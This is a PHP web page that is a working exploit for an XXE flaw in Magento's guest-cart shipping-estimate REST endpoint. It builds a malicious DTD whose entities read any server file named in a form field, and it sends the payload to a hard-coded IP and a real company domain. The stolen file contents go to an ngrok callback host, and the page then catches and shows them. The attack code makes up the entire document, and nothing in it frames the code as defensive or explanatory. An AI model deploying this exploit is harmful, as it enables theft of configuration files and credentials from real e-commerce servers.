<!DOCTYPE html>
<html>

<body>

  <form method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>">
    Name: <input type="text" name="file">
    <input type="submit">
  </form>

  <?php
  function payload_call($path = 'xxe.xml', $target = 'www.dyson.cn')
  {
    global $cnext;
    file_put_contents(
      'dtd.xml',
      "
<!ENTITY % data SYSTEM \"$cnext\">
<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'https://5751-156-197-181-134.ngrok-free.app/cnext.php?leak=%data;'>\">
"
    );

    $payload = array(
      "address" => array(
        "totalsCollector" => array(
          "collectorList" => array(
            "totalCollector" => array(
              "sourceData" => array(
                "data" => "https://5751-156-197-181-134.ngrok-free.app/$path",
                "dataIsURL" => true,
                "options" => 1337
              )
            )
          )
        )
      )
    );

    $target = "https://$target/rest/V1/guest-carts/1/estimate-shipping-methods";
    $headers = array(
      'Content-Type: application/json'
    );

    $ch = curl_init($target);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    $response = curl_exec($ch);
    $curl_error = curl_error($ch);

    if ($curl_error) {
      echo '<pre>';
      echo "cURL Error: " . $curl_error;
      echo '</pre>';
    }

    print_r($response . '<br><br>');
    curl_close($ch);
  }

  if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $cnext = $_POST['file'];
    if (empty($cnext)) {
      echo "file is empty";
    } else {
      payload_call('xxe.xml', '3.105.50.154');

      // Wait for the leak parameter to be received
      $leak = '';
      $timeout = 12; // seconds
      $interval = 1; // seconds

      while ($timeout > 0) {

        if (file_exists("leak") && filesize('leak') > 0) {
          $leak = file_get_contents("leak");
          shell_exec('rm -r leak');
          break;
        }
        sleep($interval);
        $timeout -= $interval;
      }

      if ($leak) {
        echo '<pre>';
        echo "File contents: " . $leak;
        echo '</pre>';
      } else {
        echo '<pre>';
        echo "Timed out waiting for leak parameter.";
        echo '</pre>';
      }
    }
  }

  if ($_SERVER["REQUEST_METHOD"] == "GET") :
    file_put_contents('leak', $_GET['leak']);
  // exec('touch leak', $output);
  // print_r($output);
  endif;
  ?>

</body>

</html>
